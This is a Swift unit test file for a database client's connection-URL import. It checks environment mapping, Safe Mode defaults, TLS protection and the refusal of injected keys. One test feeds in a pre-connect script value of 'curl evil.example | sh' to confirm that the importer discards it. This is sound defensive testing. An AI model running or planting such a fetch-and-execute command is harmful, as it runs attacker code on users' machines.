//
//  ConnectionDraftURLImportTests.swift
//  TableProTests
//

import Foundation
import TableProPluginKit
import Testing

@testable import TablePro

@MainActor
struct ConnectionDraftURLImportTests {
    private func traits(_ type: DatabaseType) -> ConnectionTypeTraits {
        ConnectionTypeTraits.live(for: type, pluginManager: .shared)
    }

    private func parse(_ url: String) throws -> ParsedConnectionURL {
        try ConnectionURLParser.parse(url).get()
    }

    @Test("env= sets the environment, not a tag")
    func envSetsEnvironment() throws {
        let parsed = try parse("postgresql://app@db.example.com/orders?env=production")
        #expect(parsed.environment == .production)
        let postgres = traits(.postgresql)
        var draft = ConnectionDraft.new(type: .postgresql, traits: postgres)
        draft.apply(parsed, traits: postgres, policy: .newConnection)
        #expect(draft.environment == .production)
        #expect(draft.appearance.tagIds.isEmpty)
        #expect(draft.safety.safeModeLevel == .alert)
    }

    @Test("Environment names map to the four environments and nothing else")
    func environmentNames() {
        #expect(ConnectionURLParser.environment(named: "Prod") == .production)
        #expect(ConnectionURLParser.environment(named: "staging") == .staging)
        #expect(ConnectionURLParser.environment(named: "dev") == .development)
        #expect(ConnectionURLParser.environment(named: "local") == .local)
        #expect(ConnectionURLParser.environment(named: "qa-eu") == nil)
    }

    @Test("A new connection takes the whole URL: name, Safe Mode, TLS off, raw driver options")
    func newConnectionTakesEverything() throws {
        let parsed = try parse("postgresql://app:pw@db.example.com:6543/orders?name=Orders&sslmode=disable&safemodelevel=0")
        let postgres = traits(.postgresql)
        var draft = ConnectionDraft.new(type: .postgresql, traits: postgres)
        draft.apply(parsed, traits: postgres, policy: .newConnection)
        #expect(draft.name == "Orders")
        #expect(draft.host == "db.example.com")
        #expect(draft.portText == "6543")
        #expect(draft.database == "orders")
        #expect(draft.credentials.username == "app")
        #expect(draft.credentials.password == "pw")
        #expect(draft.ssl.mode == .disabled)
    }

    @Test("A paste into a saved connection never renames, lowers Safe Mode or weakens TLS")
    func existingConnectionIsGuarded() throws {
        let postgres = traits(.postgresql)
        var draft = ConnectionDraft.new(type: .postgresql, traits: postgres)
        draft.name = "Production Orders"
        draft.safety.safeModeLevel = .safeMode
        draft.safety.userSetSafeMode = true
        draft.selectSSLMode(.verifyIdentity)
        let parsed = try parse("postgresql://app@db2.example.com/orders?name=Other&sslmode=disable&safemodelevel=0")
        draft.apply(parsed, traits: postgres, policy: .existingConnection)
        #expect(draft.name == "Production Orders")
        #expect(draft.safety.safeModeLevel == .safeMode)
        #expect(draft.ssl.mode == .verifyIdentity)
        #expect(draft.host == "db2.example.com")
    }

    @Test("A paste into a saved connection adds no raw driver options")
    func existingConnectionGetsNoRawOptions() throws {
        let mongo = traits(.mongodb)
        let parsed = try parse("mongodb://db.example.com/app?tlsInsecure=true&directConnection=true")
        var existing = ConnectionDraft.new(type: .mongodb, traits: mongo)
        existing.apply(parsed, traits: mongo, policy: .existingConnection)
        #expect(!existing.fieldValues.keys.contains { $0.hasPrefix("mongoParam_") })

        var fresh = ConnectionDraft.new(type: .mongodb, traits: mongo)
        fresh.apply(parsed, traits: mongo, policy: .newConnection)
        #expect(fresh.fieldValues["mongoParam_tlsInsecure"] == "true")
    }

    @Test("Typing a URL one character at a time never fills the form; a paste does")
    func onlyAPasteTriggers() {
        let url = "postgresql://app@db.example.com/orders"
        var typed = ""
        for character in url {
            let next = typed + String(character)
            #expect(ConnectionEditorStore.pastedURL(replacing: typed, with: next) == nil, "\(next)")
            typed = next
        }
        #expect(ConnectionEditorStore.pastedURL(replacing: "", with: url) == url)
        #expect(ConnectionEditorStore.pastedURL(replacing: "db", with: "not a url at all") == nil)
    }

    @Test("A URL import never carries an app-managed key such as a script")
    func appManagedKeysAreRefused() throws {
        let parsed = try parse("postgresql://db.example.com/orders")
        let injected = ParsedConnectionURL(
            type: parsed.type, host: parsed.host, port: parsed.port, database: parsed.database,
            username: parsed.username, password: parsed.password, sslMode: parsed.sslMode,
            disablesTLS: parsed.disablesTLS, authSource: nil, sshHost: nil, sshPort: nil, sshUsername: nil,
            sshPassword: nil, usePrivateKey: nil, useSSHAgent: nil, sshNoAuth: nil, agentSocket: nil,
            connectionName: nil, redisDatabase: nil, statusColor: nil, envTag: nil, schema: nil, tableName: nil,
            isView: false, filterColumn: nil, filterOperation: nil, filterValue: nil, filterCondition: nil,
            oracleServiceName: nil, safeModeLevel: nil, useSrv: false, mongoQueryParams: [:], multiHost: nil,
            additionalFields: ["preConnectScript": "curl evil.example | sh", "promptForPassword": "true"]
        )
        let postgres = traits(.postgresql)
        var draft = ConnectionDraft.new(type: .postgresql, traits: postgres)
        draft.apply(injected, traits: postgres, policy: .newConnection)
        #expect(draft.fieldValues["preConnectScript"] == nil)
        #expect(draft.options.preConnectScript.isEmpty)
        let edits = ConnectionEditorEngine.edits(draft, postgres, originalTraits: nil, EditorContext())
        #expect(edits.additionalFields["preConnectScript"] == nil)
        #expect(edits.tunnelCommandMode == .disabled)
        #expect(edits.startupCommands == nil)
    }

    @Test("Production picks Alert until the user sets Safe Mode; back to Development returns the default")
    func productionDefaultsSafeMode() {
        let postgres = traits(.postgresql)
        var draft = ConnectionDraft.new(type: .postgresql, traits: postgres)
        draft.setEnvironment(.production)
        #expect(draft.safety.safeModeLevel == .alert)
        draft.setEnvironment(.development)
        #expect(draft.safety.safeModeLevel == .silent)

        draft.setEnvironment(.production)
        draft.setSafeModeLevel(.safeMode, floor: nil)
        draft.setEnvironment(.development)
        #expect(draft.safety.safeModeLevel == .safeMode)
    }

    @Test("A loaded connection keeps its Safe Mode when the environment changes")
    func loadedConnectionKeepsSafeMode() {
        let postgres = traits(.postgresql)
        var connection = DatabaseConnection(name: "Orders", type: .postgresql)
        connection.preferredSafeModeLevel = .silent
        var draft = ConnectionDraft.loaded(from: connection, secrets: .none, traits: postgres)
        draft.setEnvironment(.production)
        #expect(draft.safety.safeModeLevel == .silent)
    }
}
